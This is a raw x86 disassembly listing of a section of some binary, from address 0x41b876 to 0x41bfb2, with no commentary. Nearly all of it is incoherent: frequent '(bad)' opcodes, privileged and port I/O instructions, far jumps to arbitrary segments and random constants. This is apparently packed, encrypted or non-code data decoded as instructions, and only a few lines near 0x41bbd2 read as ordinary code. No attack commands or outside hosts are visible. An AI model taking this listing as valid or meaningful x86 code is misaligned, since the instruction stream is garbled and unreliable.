  41b876:	or     eax,0xdfd8afad
  41b87b:	iret   
  41b87c:	leave  
  41b87d:	mov    dh,BYTE PTR [eax+0x2ba4a10d]
  41b883:	mov    al,0xa7
  41b885:	pop    ss
  41b886:	mov    edi,0xa70299d4
  41b88b:	push   eax
  41b88c:	or     BYTE PTR ds:0x3035c378,dl
  41b892:	jmp    0x41b900
  41b894:	adc    DWORD PTR [ebx+0x39c643ee],0x3d2c14a4
  41b89e:	mov    WORD PTR [edx-0x72790615],ds
  41b8a4:	jl     0x41b85a
  41b8a6:	imul   DWORD PTR [eax+0x4aec1a17]
  41b8ac:	es scas al,BYTE PTR es:[edi]
  41b8ae:	pop    edx
  41b8af:	mov    ebx,esi
  41b8b1:	inc    esi
  41b8b2:	dec    DWORD PTR [edx-0x190fec2b]
  41b8b8:	in     eax,dx
  41b8b9:	cmp    bh,BYTE PTR [edx]
  41b8bb:	pop    ebx
  41b8bc:	jne    0x41b8ae
  41b8be:	dec    ecx
  41b8bf:	ret    
  41b8c0:	sbb    ebp,DWORD PTR [edx-0x6058053e]
  41b8c6:	sub    dl,dl
  41b8c8:	xchg   esp,eax
  41b8c9:	xchg   BYTE PTR [ebp+0x2d],cl
  41b8cc:	lods   al,BYTE PTR ds:[esi]
  41b8cd:	push   ebp
  41b8ce:	sbb    esi,esi
  41b8d0:	and    bh,al
  41b8d2:	sub    eax,0x21eeac9c
  41b8d7:	out    0xd2,al
  41b8d9:	xor    eax,0x459ac88c
  41b8de:	lods   al,BYTE PTR ds:[esi]
  41b8df:	push   0x74a2b5d2
  41b8e4:	daa    
  41b8e5:	pop    ebx
  41b8e6:	xchg   edi,esp
  41b8e8:	gs dec esp
  41b8ea:	idiv   DWORD PTR [esi]
  41b8ec:	outs   dx,BYTE PTR es:[esi]
  41b8ee:	pop    ecx
  41b8ef:	xlat   BYTE PTR ds:[ebx]
  41b8f0:	in     al,0x9c
  41b8f2:	fsubrp st(3),st
  41b8f4:	icebp  
  41b8f5:	mov    al,0x41
  41b8f7:	adc    ebp,DWORD PTR [edi+0x7]
  41b8fa:	xchg   edi,eax
  41b8fb:	mov    bh,0xcc
  41b8fd:	and    BYTE PTR ds:0x5a84d239,dh
  41b903:	scas   al,BYTE PTR es:[edi]
  41b904:	cmp    dl,BYTE PTR [esi+0x3213488c]
  41b90a:	jae    0x41b8e8
  41b90c:	mov    bl,0x84
  41b90e:	pushf  
  41b90f:	je     0x41b8fc
  41b911:	int3   
  41b912:	push   ds
  41b913:	xchg   ecx,eax
  41b914:	or     ecx,esp
  41b916:	clc    
  41b917:	mov    bl,0xdb
  41b919:	sbb    eax,0xa8dcfce6
  41b91e:	sub    eax,ebp
  41b920:	imul   edx,ebp,0xfffffff1
  41b923:	loop   0x41b924
  41b925:	mov    ebp,0x72d8a2f
  41b92a:	jbe    0x41b8dc
  41b92c:	inc    ebp
  41b92d:	call   DWORD PTR [ebx]
  41b92f:	sbb    esp,eax
  41b931:	push   ds
  41b932:	mov    ds:0x108ae59f,al
  41b937:	ins    BYTE PTR es:[edi],dx
  41b938:	adc    DWORD PTR [ebp+0x19],ecx
  41b93b:	and    eax,0xd55920e3
  41b940:	fwait
  41b941:	xchg   ecx,eax
  41b942:	jb     0x41b98d
  41b944:	push   ebp
  41b945:	idiv   BYTE PTR [ebp+0x4890a720]
  41b94b:	jecxz  0x41b8f8
  41b94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b94e:	scas   al,BYTE PTR es:[edi]
  41b94f:	cmp    DWORD PTR fs:[ecx+edi*2],ecx
  41b953:	inc    edx
  41b954:	adc    eax,0x762c2ef7
  41b959:	sar    DWORD PTR [esi+edi*1],1
  41b95c:	mul    BYTE PTR [ecx]
  41b95e:	ror    DWORD PTR [ebx],cl
  41b960:	lods   al,BYTE PTR ds:[esi]
  41b961:	and    al,0xcf
  41b963:	nop
  41b964:	xchg   BYTE PTR [edi],cl
  41b966:	jp     0x41b992
  41b968:	sub    DWORD PTR [edx],eax
  41b96a:	inc    ecx
  41b96b:	xchg   ebp,eax
  41b96c:	test   al,0xdd
  41b96e:	xchg   edx,eax
  41b96f:	sbb    al,0xf5
  41b971:	(bad)  
  41b972:	jns    0x41b98a
  41b974:	mov    ebx,0x92c4c263
  41b979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b97a:	xchg   ebx,eax
  41b97b:	and    DWORD PTR [ebp+eiz*2-0x7d055dcd],esp
  41b982:	rcr    BYTE PTR [esp+ebx*1+0x2481e0a5],0x9a
  41b98a:	fwait
  41b98b:	mov    bh,0x3f
  41b98d:	sahf   
  41b98e:	add    dh,BYTE PTR [edi+ebx*2-0x47]
  41b992:	bound  esp,QWORD PTR [edx+edi*8]
  41b995:	push   0x52
  41b997:	mov    al,0x8
  41b999:	xchg   edx,eax
  41b99a:	or     edx,DWORD PTR [ebp-0x1ac8a4f0]
  41b9a0:	mov    dh,0xa7
  41b9a2:	(bad)  
  41b9a3:	scas   eax,DWORD PTR es:[edi]
  41b9a4:	xchg   DWORD PTR [esi+esi*1-0x3c6a8ecf],edx
  41b9ab:	mov    esi,0x922ad565
  41b9b0:	outs   dx,DWORD PTR ds:[esi]
  41b9b1:	and    al,0x81
  41b9b3:	in     al,0x7
  41b9b5:	jb     0x41b979
  41b9b7:	arpl   WORD PTR [eax-0x7de1ecbe],bp
  41b9bd:	jmp    0x4d77:0x9233696a
  41b9c4:	lods   al,BYTE PTR ds:[esi]
  41b9c5:	and    al,0x8b
  41b9c7:	jno    0x41ba1c
  41b9c9:	inc    edx
  41b9ca:	or     BYTE PTR [ebx+0x50946e07],bh
  41b9d0:	jbe    0x41b9b5
  41b9d2:	mov    bl,0x74
  41b9d4:	fld    TBYTE PTR [eax]
  41b9d6:	adc    ebp,DWORD PTR [ebx+esi*1]
  41b9d9:	mov    eax,0xf720f365
  41b9de:	add    ebp,esp
  41b9e0:	pop    edi
  41b9e1:	sbb    al,0xd
  41b9e3:	loop   0x41ba36
  41b9e5:	adc    al,0x48
  41b9e7:	sub    bl,bl
  41b9e9:	mov    cl,0xec
  41b9eb:	or     bl,BYTE PTR [eax]
  41b9ed:	add    eax,0xce6a57f4
  41b9f2:	inc    eax
  41b9f3:	jns    0x41b9c2
  41b9f5:	(bad)  [esi+0x1]
  41b9f8:	stos   DWORD PTR es:[edi],eax
  41b9f9:	inc    edi
  41b9fa:	mov    edx,0xcea22b1c
  41b9ff:	(bad)  
  41ba00:	lock aam 0x74
  41ba03:	scas   eax,DWORD PTR es:[edi]
  41ba04:	xchg   ecx,eax
  41ba05:	fnstenv [ebx]
  41ba07:	pop    esi
  41ba08:	mov    ah,0x17
  41ba0a:	pop    esi
  41ba0b:	popa   
  41ba0c:	stc    
  41ba0d:	js     0x41ba2e
  41ba0f:	mov    esp,0xe556e402
  41ba14:	fimul  WORD PTR [ebp+0x70]
  41ba17:	stc    
  41ba18:	and    BYTE PTR [edx],dl
  41ba1a:	and    al,0x6a
  41ba1c:	jg     0x41b9e9
  41ba1e:	fs scas eax,DWORD PTR es:[edi]
  41ba20:	repz fs ret 
  41ba23:	and    eax,0x6b1154f6
  41ba28:	popa   
  41ba29:	mov    al,ds:0x9295e102
  41ba2e:	adc    DWORD PTR [eax-0x7d60ce40],ecx
  41ba34:	popa   
  41ba35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba36:	mov    bh,0x24
  41ba38:	adc    al,0x3
  41ba3a:	aas    
  41ba3b:	cmp    al,0xea
  41ba3d:	popa   
  41ba3e:	jl     0x41ba3c
  41ba40:	retf   0xc71c
  41ba43:	call   0xacbe:0xf5ebd871
  41ba4a:	mov    DWORD PTR [ebx],edi
  41ba4c:	sti    
  41ba4d:	loopne 0x41ba55
  41ba4f:	jo     0x41ba7f
  41ba51:	fdiv   DWORD PTR [ebx]
  41ba53:	fadd   st(5),st
  41ba55:	js     0x41ba6b
  41ba57:	add    eax,0x3c61eef6
  41ba5c:	xchg   edx,eax
  41ba5d:	or     eax,edi
  41ba5f:	jb     0x41ba5c
  41ba61:	sub    eax,0xb0112a9d
  41ba66:	ss inc esp
  41ba68:	mov    bl,0x8c
  41ba6a:	out    dx,al
  41ba6b:	sbb    bp,WORD PTR [edx+0x2dbec8b9]
  41ba72:	imul   ebx,DWORD PTR [esi+ecx*8+0x1f82c927],0xffffffe0
  41ba7a:	cmp    ebx,0xffffffe0
  41ba7d:	ror    ebx,1
  41ba7f:	cmp    BYTE PTR [esi],ch
  41ba81:	jne    0x41ba77
  41ba83:	gs retf 
  41ba85:	mov    ecx,DWORD PTR [eax]
  41ba87:	sbb    esi,DWORD PTR [edx+0x19df6343]
  41ba8d:	sub    eax,0x13824e1e
  41ba92:	(bad)  
  41ba93:	and    eax,0xde8ec9ce
  41ba98:	bound  ebp,QWORD PTR [esi-0x166b1965]
  41ba9e:	mov    eax,0x2619225d
  41baa3:	push   cs
  41baa4:	mov    al,ds:0xc4232a79
  41baa9:	xor    dh,BYTE PTR [ecx+0x269a58aa]
  41baaf:	ja     0x41ba40
  41bab1:	rcr    cl,0x28
  41bab4:	stc    
  41bab5:	jno    0x41bad7
  41bab7:	ins    DWORD PTR es:[edi],dx
  41bab8:	pop    ebx
  41bab9:	sub    al,0xb2
  41babb:	out    0xd8,eax
  41babd:	fldlg2 
  41babf:	add    BYTE PTR [esi-0x40],0x36
  41bac3:	das    
  41bac4:	push   esi
  41bac5:	mov    ebp,0x184a282a
  41baca:	rcr    ebp,cl
  41bacc:	push   es
  41bacd:	ins    DWORD PTR es:[edi],dx
  41bace:	jo     0x41bb3f
  41bad0:	icebp  
  41bad1:	pop    ss
  41bad2:	ror    BYTE PTR [edi-0x19],cl
  41bad5:	ds jp  0x41ba93
  41bad8:	loop   0x41bac0
  41bada:	jns    0x41baca
  41badc:	jecxz  0x41baac
  41bade:	mov    eax,DWORD PTR [esi+edi*4-0xf0821d7]
  41bae5:	mov    dl,0x6d
  41bae7:	test   al,0xe7
  41bae9:	leave  
  41baea:	mov    dh,0xe5
  41baec:	aaa    
  41baed:	mov    bh,0xa3
  41baef:	fbld   TBYTE PTR [edx]
  41baf1:	loope  0x41bb24
  41baf3:	inc    esi
  41baf4:	outs   dx,DWORD PTR ds:[esi]
  41baf5:	fwait
  41baf6:	hlt    
  41baf7:	mov    ebx,0xd03c6c10
  41bafc:	xlat   BYTE PTR ds:[ebx]
  41bafd:	jne    0x41ba98
  41baff:	cs and eax,0x5b75d5e9
  41bb05:	xchg   ebx,eax
  41bb06:	cdq    
  41bb07:	dec    ecx
  41bb08:	push   ebx
  41bb09:	dec    ebp
  41bb0a:	enter  0xe2a0,0xfb
  41bb0e:	test   DWORD PTR [edx+0x10],ebp
  41bb11:	jmp    0x9676b51d
  41bb16:	fcomp  DWORD PTR [ebp-0x54]
  41bb19:	out    dx,eax
  41bb1a:	cli    
  41bb1b:	out    dx,al
  41bb1c:	push   esi
  41bb1d:	add    esp,DWORD PTR [eax+0x70a72a4e]
  41bb23:	loope  0x41bb55
  41bb25:	push   ss
  41bb26:	push   esp
  41bb27:	fld    TBYTE PTR [esi]
  41bb29:	pop    esi
  41bb2a:	or     bl,BYTE PTR [eax]
  41bb2c:	adc    al,0xd7
  41bb2e:	mov    ds:0x7062bdcb,al
  41bb33:	pop    esi
  41bb34:	xor    bl,BYTE PTR [ebp+0xc37e3ba]
  41bb3a:	ret    
  41bb3b:	push   edi
  41bb3c:	lock mov dh,0xbf
  41bb3f:	mov    WORD PTR [ecx-0x34],?
  41bb42:	sbb    BYTE PTR [edx-0x49],ah
  41bb45:	es mov bl,0x89
  41bb48:	cmp    eax,0x1a812516
  41bb4d:	fdivr  DWORD PTR [ebx]
  41bb4f:	mov    eax,ds:0xaadc1217
  41bb54:	jmp    0xff33:0xbaf35004
  41bb5b:	sbb    DWORD PTR [ebp+0x75],0xffffff91
  41bb5f:	push   ecx
  41bb60:	mov    DWORD PTR [edx+0x48],eax
  41bb63:	hlt    
  41bb64:	xor    ecx,esp
  41bb66:	or     eax,0xf0acd1e2
  41bb6b:	(bad)  
  41bb6c:	jl     0x41bb44
  41bb6e:	mov    cl,0xe
  41bb70:	cmp    BYTE PTR [ecx+0x38],bl
  41bb73:	and    DWORD PTR [esi+0x2efb4cec],ebx
  41bb79:	jp     0x41bbab
  41bb7b:	mov    ebp,0xa232db27
  41bb80:	pop    eax
  41bb81:	pushf  
  41bb82:	dec    esp
  41bb83:	push   edi
  41bb84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb85:	inc    edi
  41bb86:	ins    DWORD PTR es:[edi],dx
  41bb87:	inc    ebx
  41bb88:	mov    BYTE PTR [ecx-0x7eb78de8],dl
  41bb8e:	test   eax,0xa52e1c2c
  41bb93:	mov    ch,0x93
  41bb95:	sar    edi,1
  41bb97:	fbstp  TBYTE PTR [esi+0x25]
  41bb9a:	and    eax,0x164b9196
  41bb9f:	mov    al,0x53
  41bba1:	in     al,0xba
  41bba3:	xor    esi,DWORD PTR [ebp-0x3b]
  41bba6:	xor    dh,BYTE PTR [ecx-0x76]
  41bba9:	ror    DWORD PTR [ecx-0x4a],0x2c
  41bbad:	mov    al,ds:0x4e7758e8
  41bbb2:	fist   DWORD PTR [ebx-0x3f]
  41bbb5:	adc    eax,0x67602889
  41bbba:	xor    edi,DWORD PTR [eax]
  41bbbc:	(bad)  [edx+ebx*4]
  41bbbf:	lahf   
  41bbc0:	jmp    0xc103:0x636678e6
  41bbc7:	ret    0x73b4
  41bbca:	fdivrp st(1),st
  41bbcc:	out    0x16,al
  41bbce:	cs (bad) 
  41bbd1:	inc    eax
  41bbd2:	and    cx,dx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	cmp    eax,0x3be3f10
  41bc06:	adc    DWORD PTR [esi],0x1812bc18
  41bc0c:	sbb    al,dh
  41bc0e:	sti    
  41bc0f:	mov    ah,0xf6
  41bc11:	jge    0x41bbce
  41bc13:	(bad)  
  41bc14:	jg     0x41bc0e
  41bc16:	hlt    
  41bc17:	adc    BYTE PTR [esp+eiz*4-0x3f53145],al
  41bc1e:	into   
  41bc1f:	mov    ah,0x47
  41bc21:	adc    al,0xa4
  41bc23:	xor    DWORD PTR [ecx],0x60
  41bc26:	mov    esp,0x5b272a73
  41bc2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc2c:	pop    edi
  41bc2d:	clc    
  41bc2e:	out    0x4d,al
  41bc30:	retf   
  41bc31:	sbb    eax,esi
  41bc33:	mov    eax,0x3c8edd0b
  41bc38:	adc    eax,0x2f08945c
  41bc3d:	mov    ss,WORD PTR [ebx+0x75]
  41bc40:	sbb    BYTE PTR [edx+0x3bfe000a],ch
  41bc46:	sub    edx,eax
  41bc48:	sbb    esi,DWORD PTR ds:0xf560a028
  41bc4e:	clc    
  41bc4f:	xchg   ecx,eax
  41bc50:	xchg   ecx,eax
  41bc51:	lods   al,BYTE PTR ds:[esi]
  41bc52:	daa    
  41bc53:	xchg   DWORD PTR [ecx-0x380a1b43],eax
  41bc59:	leave  
  41bc5a:	adc    esi,DWORD PTR [ecx-0x52]
  41bc5d:	adc    edi,eax
  41bc5f:	xchg   ecx,eax
  41bc60:	pop    esp
  41bc61:	add    al,0xca
  41bc63:	pop    ecx
  41bc64:	jp     0x41bc5d
  41bc66:	shl    DWORD PTR [ebp+0x60c59006],0x9b
  41bc6d:	push   eax
  41bc6e:	lods   al,BYTE PTR ds:[esi]
  41bc6f:	xor    BYTE PTR [ebx],ah
  41bc71:	scas   al,BYTE PTR es:[edi]
  41bc72:	(bad)  
  41bc73:	data16 arpl WORD PTR [esi-0x3e],bp
  41bc77:	cmp    al,0xef
  41bc79:	sbb    DWORD PTR [ebx-0x6d15ce3e],esp
  41bc7f:	sti    
  41bc80:	pop    DWORD PTR [edi-0x7e8f42dc]
  41bc86:	ins    DWORD PTR es:[edi],dx
  41bc87:	aaa    
  41bc88:	(bad)  
  41bc89:	mov    al,0xfb
  41bc8b:	mov    bl,0x2f
  41bc8d:	clc    
  41bc8e:	cwde   
  41bc8f:	xlat   BYTE PTR ds:[ebx]
  41bc90:	push   ebp
  41bc91:	push   0xffffffb8
  41bc93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc94:	xchg   cl,cl
  41bc96:	or     ebx,esi
  41bc98:	mov    cl,0xdd
  41bc9a:	shl    BYTE PTR [eax-0x23],0xc6
  41bc9e:	or     ah,cl
  41bca0:	iret   
  41bca1:	scas   eax,DWORD PTR es:[edi]
  41bca2:	adc    al,0x18
  41bca4:	mov    esi,0x372ef56c
  41bca9:	jge    0x41bcc2
  41bcab:	mov    ds:0x8827194c,eax
  41bcb0:	int    0xc6
  41bcb2:	add    BYTE PTR [ecx+0x12164d34],bl
  41bcb8:	(bad)  
  41bcb9:	lods   al,BYTE PTR ds:[esi]
  41bcba:	(bad)  
  41bcbb:	call   0x4568:0xc1b32a06
  41bcc2:	scas   eax,DWORD PTR es:[edi]
  41bcc3:	mov    bl,BYTE PTR [ecx-0x28]
  41bcc6:	adc    al,0x7e
  41bcc8:	adc    eax,0x1314bdda
  41bccd:	imul   edx,esp,0xb1d1aa7c
  41bcd3:	in     al,0xa0
  41bcd5:	andps  xmm0,XMMWORD PTR ds:0xd410e805
  41bcdc:	jb     0x41bd20
  41bcde:	lods   eax,DWORD PTR ds:[esi]
  41bcdf:	(bad)  [edx]
  41bce1:	mov    eax,ds:0x4d6cde85
  41bce6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bce7:	enter  0x22ec,0xc
  41bceb:	divps  xmm7,XMMWORD PTR [edi-0x67]
  41bcef:	mov    cl,0x98
  41bcf1:	hlt    
  41bcf2:	push   edx
  41bcf3:	cmp    al,0x1f
  41bcf5:	xor    dh,BYTE PTR [eax-0x71]
  41bcf8:	leave  
  41bcf9:	in     eax,dx
  41bcfa:	jg     0x41bd13
  41bcfc:	shl    BYTE PTR [edx-0x46],0x8f
  41bd00:	rol    DWORD PTR [esi],1
  41bd02:	pop    edx
  41bd03:	and    al,0xc4
  41bd05:	ficom  DWORD PTR [ecx]
  41bd07:	jg     0x41bd31
  41bd09:	xchg   edi,eax
  41bd0a:	jge    0x41bcbd
  41bd0c:	inc    ebx
  41bd0d:	es mov cl,0xc0
  41bd10:	jl     0x41bcd5
  41bd12:	add    BYTE PTR [eax-0x7ec3d700],al
  41bd18:	xor    al,0x1b
  41bd1a:	fiadd  DWORD PTR [esi-0x7fbc6d9]
  41bd20:	cmp    ah,BYTE PTR [ecx-0x90f10b3]
  41bd26:	sub    DWORD PTR [esi],edx
  41bd28:	jmp    edx
  41bd2a:	in     eax,0x27
  41bd2c:	and    eax,DWORD PTR [ecx+0x5c]
  41bd2f:	out    dx,al
  41bd30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd31:	pop    ds
  41bd32:	add    ebp,DWORD PTR [edx+edi*1]
  41bd35:	pop    es
  41bd36:	inc    BYTE PTR [edx+0x40]
  41bd39:	or     edx,DWORD PTR [edx]
  41bd3b:	xlat   BYTE PTR ds:[ebx]
  41bd3c:	and    ch,BYTE PTR [esi]
  41bd3e:	jmp    0x56a8:0xc3821267
  41bd45:	mov    al,0x22
  41bd47:	jne    0x41bd4e
  41bd49:	jp     0x41bda8
  41bd4b:	sbb    al,0x95
  41bd4d:	(bad)  
  41bd4f:	inc    edi
  41bd50:	sub    edx,DWORD PTR [edi+0x1c]
  41bd53:	jg     0x41bd90
  41bd55:	add    BYTE PTR [edi],dl
  41bd57:	popf   
  41bd58:	xchg   BYTE PTR [esp+ebp*2],ah
  41bd5b:	leave  
  41bd5c:	in     al,0x57
  41bd5e:	jno    0x41bd9a
  41bd60:	add    esi,eax
  41bd62:	outs   dx,DWORD PTR ds:[esi]
  41bd63:	jle    0x41bdc0
  41bd65:	jecxz  0x41bdc1
  41bd67:	ins    DWORD PTR es:[edi],dx
  41bd68:	(bad)  
  41bd69:	call   0x62224605
  41bd6e:	pop    ds
  41bd6f:	sbb    al,0x4
  41bd71:	or     eax,0x3761ca94
  41bd76:	cmc    
  41bd77:	pushf  
  41bd78:	mov    esi,0xf4e36bfe
  41bd7d:	mov    al,0xcc
  41bd7f:	les    esi,FWORD PTR [edx]
  41bd81:	(bad)  
  41bd82:	sub    DWORD PTR ds:0x9d45b15,eax
  41bd88:	mov    ss,WORD PTR [eax+0x471a7776]
  41bd8e:	adc    al,0x48
  41bd90:	pop    es
  41bd91:	and    eax,0x7e2dbb9b
  41bd96:	cwde   
  41bd97:	std    
  41bd98:	popf   
  41bd99:	pop    edx
  41bd9a:	add    al,0xa6
  41bd9c:	ins    BYTE PTR es:[edi],dx
  41bd9d:	ror    BYTE PTR [ecx+0x1b5b4460],1
  41bda3:	jns    0x41bda5
  41bda5:	int    0x29
  41bda7:	fs pushf 
  41bda9:	enter  0x904b,0x66
  41bdad:	sub    DWORD PTR [edi-0x6f15ab96],edi
  41bdb3:	jbe    0x41be1f
  41bdb5:	push   eax
  41bdb6:	jmp    0xa2c4c3ee
  41bdbb:	push   esi
  41bdbc:	rcl    esi,1
  41bdbe:	cmp    DWORD PTR [edi],eax
  41bdc0:	imul   eax,DWORD PTR [edx+0x41],0xf20084ee
  41bdc7:	push   edx
  41bdc8:	fdiv   DWORD PTR [ecx-0xd]
  41bdcb:	xchg   edi,eax
  41bdcc:	stos   DWORD PTR es:[edi],eax
  41bdcd:	loope  0x41bd7f
  41bdcf:	mov    esp,DWORD PTR [ebx+0x4555b4a8]
  41bdd5:	push   edx
  41bdd6:	xor    eax,0x18e424f6
  41bddb:	sbb    BYTE PTR [ebp+0x14c70a9e],dh
  41bde1:	mov    al,0x48
  41bde3:	add    cl,BYTE PTR [ebx]
  41bde5:	or     bl,dl
  41bde7:	je     0x41bdc7
  41bde9:	fs mov esi,0x84fca9dd
  41bdef:	sysret 
  41bdf1:	adc    al,BYTE PTR [ecx-0x3cc0900]
  41bdf7:	cwde   
  41bdf8:	pusha  
  41bdf9:	sub    al,0xc
  41bdfb:	jb     0x41bdfe
  41bdfd:	rcr    BYTE PTR [edi-0x5b],1
  41be00:	mov    al,0xd3
  41be02:	sub    DWORD PTR [eax-0xc],ebx
  41be05:	mov    eax,ds:0x5e056a04
  41be0a:	mov    edx,0xa70f2164
  41be10:	push   eax
  41be11:	sbb    al,BYTE PTR ds:0xd78974c9
  41be17:	cmc    
  41be18:	ins    BYTE PTR es:[edi],dx
  41be19:	js     0x41be48
  41be1b:	pop    esp
  41be1c:	bound  ebx,QWORD PTR [esi-0x6181f0a7]
  41be22:	stos   DWORD PTR es:[edi],eax
  41be23:	and    ch,bh
  41be25:	ror    DWORD PTR [esi-0x79],1
  41be28:	test   BYTE PTR [edi],ah
  41be2a:	fdivr  DWORD PTR [ecx+0xb]
  41be2d:	push   eax
  41be2e:	clc    
  41be2f:	xchg   esp,eax
  41be30:	jb     0x41be6e
  41be32:	(bad)  
  41be33:	xchg   ebx,eax
  41be34:	mov    bl,0xf6
  41be36:	test   al,0x38
  41be38:	mov    eax,0x50bf266d
  41be3d:	enter  0x2b24,0x7d
  41be41:	(bad)  
  41be42:	in     al,dx
  41be43:	mov    eax,ds:0xa952c215
  41be48:	pushf  
  41be49:	mov    esp,0x198087d1
  41be4e:	cmp    BYTE PTR [ecx-0x2758da1],dh
  41be54:	nop
  41be55:	cmp    esp,DWORD PTR [ecx-0x53db20bf]
  41be5b:	xchg   edi,eax
  41be5c:	and    cl,bl
  41be5e:	mov    esi,0x6ca6ca1e
  41be63:	mov    esp,0x413dc5c6
  41be68:	mov    ds:0xaf59065e,eax
  41be6d:	es shl al,1
  41be70:	sub    DWORD PTR [edx-0x1ae2f1d7],ebx
  41be76:	out    dx,al
  41be77:	cld    
  41be78:	shr    BYTE PTR [edi+0x76],cl
  41be7b:	bound  eax,QWORD PTR [eax]
  41be7d:	adc    edx,eax
  41be7f:	xchg   esp,eax
  41be80:	pop    ebp
  41be81:	jne    0x41bee1
  41be83:	pop    ss
  41be84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be85:	fstp   DWORD PTR [esp+ebp*2-0x612381c0]
  41be8c:	push   esi
  41be8d:	ret    
  41be8e:	loop   0x41be34
  41be90:	test   DWORD PTR [edx],0x41a450b6
  41be96:	jb     0x41be40
  41be98:	sub    bh,BYTE PTR [ecx-0x1b19c211]
  41be9e:	stc    
  41be9f:	sbb    BYTE PTR [edi+0x2],bh
  41bea2:	in     al,dx
  41bea3:	push   es
  41bea4:	pop    ss
  41bea5:	cli    
  41bea6:	or     ebx,ecx
  41bea8:	cs pop ebp
  41beaa:	adc    ecx,DWORD PTR [edi]
  41beac:	(bad)  
  41bead:	stos   BYTE PTR es:[edi],al
  41beae:	xchg   ebp,eax
  41beaf:	xchg   ecx,eax
  41beb0:	sbb    al,0x93
  41beb2:	jl     0x41be44
  41beb4:	cld    
  41beb5:	cmp    DWORD PTR [edi],ecx
  41beb7:	push   ebp
  41beb8:	mov    ecx,0x9cca0f6c
  41bebd:	cmp    ecx,esi
  41bebf:	mov    WORD PTR [edi+0x625815f3],gs
  41bec5:	out    0xc2,eax
  41bec7:	leave  
  41bec8:	in     al,dx
  41bec9:	lahf   
  41beca:	push   0x71f43cb7
  41becf:	das    
  41bed0:	ss (bad) 
  41bed2:	pop    ebp
  41bed3:	popa   
  41bed4:	mov    esp,0x9fb4b2f5
  41bed9:	mov    esp,0x4c8d1730
  41bede:	call   0x7953:0x17e917b4
  41bee5:	xlat   BYTE PTR ds:[ebx]
  41bee6:	add    BYTE PTR [eax-0x1a],dl
  41bee9:	pop    ecx
  41beea:	push   es
  41beeb:	scas   eax,DWORD PTR es:[edi]
  41beec:	sub    BYTE PTR [edx],bh
  41beee:	loop   0x41bec5
  41bef0:	and    cl,cl
  41bef2:	cmp    al,0x6b
  41bef4:	mov    al,0x7f
  41bef6:	gs clc 
  41bef8:	les    esp,FWORD PTR [esi-0xab8e59b]
  41befe:	inc    esi
  41beff:	addr16 push ds
  41bf01:	inc    ebx
  41bf02:	sahf   
  41bf03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf04:	mov    ds:0x965959b2,eax
  41bf09:	adc    eax,0xcbd1a3a1
  41bf0e:	outs   dx,BYTE PTR ds:[esi]
  41bf0f:	int    0xd7
  41bf11:	imul   ebp,DWORD PTR [bp+si+0x52f7],0xffffffde
  41bf17:	and    edi,DWORD PTR [edi+ebp*2-0x43]
  41bf1b:	push   ds
  41bf1c:	mov    dh,BYTE PTR [edi]
  41bf1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf1f:	enter  0xc5cd,0xf5
  41bf23:	xor    ch,0x84
  41bf26:	neg    BYTE PTR [edx+0x57]
  41bf29:	add    DWORD PTR [eax+0x78],edi
  41bf2c:	add    al,0x9c
  41bf2e:	test   DWORD PTR [edx+0x2494cfdd],ebp
  41bf34:	adc    al,0x43
  41bf36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf37:	adc    BYTE PTR [ebx+0x5587a8d3],0x59
  41bf3e:	in     eax,0x93
  41bf40:	mov    dl,0x2d
  41bf42:	mov    ebx,0x25ff65e9
  41bf47:	test   DWORD PTR [ebx],esi
  41bf49:	mov    dh,BYTE PTR [eax]
  41bf4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf4c:	mov    al,ds:0x92a08830
  41bf51:	repz rcl DWORD PTR [esi+ebp*1-0x74489f1e],0xf1
  41bf5a:	ret    
  41bf5b:	push   0x66
  41bf5d:	xor    ebx,eax
  41bf5f:	dec    ebx
  41bf60:	out    dx,al
  41bf61:	leave  
  41bf62:	in     al,0xf2
  41bf64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf66:	(bad)  
  41bf67:	sti    
  41bf68:	xor    ah,BYTE PTR [edx]
  41bf6a:	sbb    ah,BYTE PTR [ebp+edi*4+0x35169609]
  41bf71:	ins    BYTE PTR es:[edi],dx
  41bf72:	mov    BYTE PTR [eax],dl
  41bf74:	popf   
  41bf75:	aad    0x2
  41bf77:	jecxz  0x41bf30
  41bf79:	enter  0x8c9b,0xfd
  41bf7d:	and    al,0x7d
  41bf7f:	dec    ebx
  41bf80:	bound  ebx,QWORD PTR [ebx+ebx*1]
  41bf83:	call   0x3678c741
  41bf88:	mov    ebp,0xddca1794
  41bf8d:	dec    ecx
  41bf8e:	mov    eax,ds:0x15e532bc
  41bf93:	test   esi,ebx
  41bf95:	retf   0x3d
  41bf98:	pop    ds
  41bf99:	dec    ebx
  41bf9a:	lahf   
  41bf9b:	cdq    
  41bf9c:	popa   
  41bf9d:	mov    esp,0x292878df
  41bfa2:	xlat   BYTE PTR ds:[ebx]
  41bfa3:	xchg   esp,eax
  41bfa4:	push   ss
  41bfa5:	xor    esp,DWORD PTR [ecx]
  41bfa7:	(bad)  
  41bfa8:	push   ebp
  41bfa9:	sti    
  41bfaa:	lahf   
  41bfab:	cs xchg ebp,eax
  41bfad:	dec    edi
  41bfae:	xchg   edi,eax
  41bfaf:	pop    ecx
  41bfb0:	or     al,0xf0
  41bfb2:	pop    ebx
